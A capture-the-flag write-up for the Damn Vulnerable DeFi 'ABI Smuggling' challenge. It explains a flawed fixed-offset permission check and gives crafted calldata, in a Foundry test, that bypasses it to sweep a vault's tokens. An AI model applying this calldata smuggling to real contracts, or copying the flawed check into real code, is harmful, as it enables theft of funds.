# Challenge - ABI Smuggling

There’s a permissioned vault with 1 million DVT tokens deposited. The vault allows withdrawing funds periodically, as well as taking all funds out in case of emergencies.

The contract has an embedded generic authorization scheme, only allowing known accounts to execute specific actions.

The dev team has received a responsible disclosure saying all funds can be stolen.

## Objective of CTF

Rescue all funds from the vault, transferring them to the designated recovery account.

## Vulnerability Analysis

The vault has two key functions, `withdraw` and `sweepFunds`. These functions can only be executed by authorized contracts (e.g.`SelfAuthorizedVault` contract). The executor contract includes an `execute` function to trigger actions on the vault. However, before an action is executed, the `execute` function checks if the caller has permission. Under normal circumstances, only the `deployer` role can invoke `sweepFunds` function, as shown below:

```solidity
function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
    // Read the 4-bytes selector at the beginning of `actionData`
    bytes4 selector;
    uint256 calldataOffset = 4 + 32 * 3; // calldata position where `actionData` begins
    assembly {
        selector := calldataload(calldataOffset)
    }

    if (!permissions[getActionId(selector, msg.sender, target)]) {
        revert NotAllowed();
    }

    _beforeFunctionCall(target, actionData);

    return target.functionCall(actionData);
}
```

However, this `execute` function only checks a specific location in the calldata to determine whether the action is allowed. This opens the door to an attack where we can bypass the permission check by manipulating the calldata.

Below is the normal calldata to call the `execute` function, where the `target` is the vault and `actionData` triggers the `sweepFunds` function:

```
// 1cff79cd                                                         -> `execute` function
// 0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264 -> vault address
// 0000000000000000000000000000000000000000000000000000000000000040 -> offset
// 0000000000000000000000000000000000000000000000000000000000000044 -> length
// 85fb709d                                                         -> `sweepFunds` function
// 00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea -> recovery address
// 0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b -> token address
```

This will fail with a `NotAllowed` error because we are not authorized to call `sweepFunds` function.

However, by manipulating the offset in the calldata, we can trick the contract into passing the permission check:

```
// 1cff79cd                                                         -> `execute` function
// 0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264 -> vault address
// 0000000000000000000000000000000000000000000000000000000000000080 -> offset
// 0000000000000000000000000000000000000000000000000000000000000044
// d9caed1200000000000000000000000000000000000000000000000000000000 -> for pass the permission check
// 0000000000000000000000000000000000000000000000000000000000000044 -> length
// 85fb709d                                                         -> `sweepFunds` function
// 00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea -> recovery address
// 0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b -> token address
```

In this modified version, we alter the offset and include filler data, effectively bypassing the permission check while still calling `sweepFunds` function.

### Attack steps:

1. Craft a malicious calldata to bypass the permission check and call the `sweepFunds` function to rescue the tokens to the `recovery` address.

## PoC test case

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";
import "forge-std/console.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_abiSmuggling() public checkSolvedByPlayer {
        emit log("-------------------------- Before exploit --------------------------");
        emit log_named_decimal_uint("token balance in the vault", token.balanceOf(address(vault)), token.decimals());
        emit log_named_decimal_uint(
            "token balance in the recovery address", token.balanceOf(recovery), token.decimals()
        );

        // calldata to call the `execute` function with the `target` as the vault and the `actionData` to call sweepFunds.
        // This will revert with a `NotAllowed` error

        // 1cff79cd                                                         -> `execute` function signature
        // 0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264 -> vault address
        // 0000000000000000000000000000000000000000000000000000000000000040 -> offset
        // 0000000000000000000000000000000000000000000000000000000000000044 -> length
        // 85fb709d                                                         -> `sweepFunds` function signature
        // 00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea -> recovery address
        // 0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b -> token address

        // craft the malicious calldata to bypass the permission check

        // 1cff79cd                                                         -> `execute` function signature
        // 0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264 -> vault address
        // 0000000000000000000000000000000000000000000000000000000000000080 -> offset
        // 0000000000000000000000000000000000000000000000000000000000000044
        // d9caed1200000000000000000000000000000000000000000000000000000000
        // 0000000000000000000000000000000000000000000000000000000000000044 -> length
        // 85fb709d                                                         -> `sweepFunds` function signature
        // 00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea -> recovery address
        // 0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b -> token address

        (bool success,) = address(vault).call(
            hex"1cff79cd0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b26400000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000044d9caed1200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004485fb709d00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b"
        );
        require(success);

        emit log("-------------------------- Before exploit --------------------------");
        emit log_named_decimal_uint("token balance in the vault", token.balanceOf(address(vault)), token.decimals());
        emit log_named_decimal_uint(
            "token balance in the recovery address", token.balanceOf(recovery), token.decimals()
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
```

### Test Result

```
Ran 2 tests for test/abi-smuggling/ABISmuggling.t.sol:ABISmugglingChallenge
[PASS] test_abiSmuggling() (gas: 75890)
Logs:
  -------------------------- Before exploit --------------------------
  token balance in the vault: 1000000.000000000000000000
  token balance in the recovery address: 0.000000000000000000
  -------------------------- After exploit --------------------------
  token balance in the vault: 0.000000000000000000
  token balance in the recovery address: 1000000.000000000000000000

[PASS] test_assertInitialState() (gas: 32734)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.51ms (1.02ms CPU time)

Ran 1 test suite in 231.64ms (1.51ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```
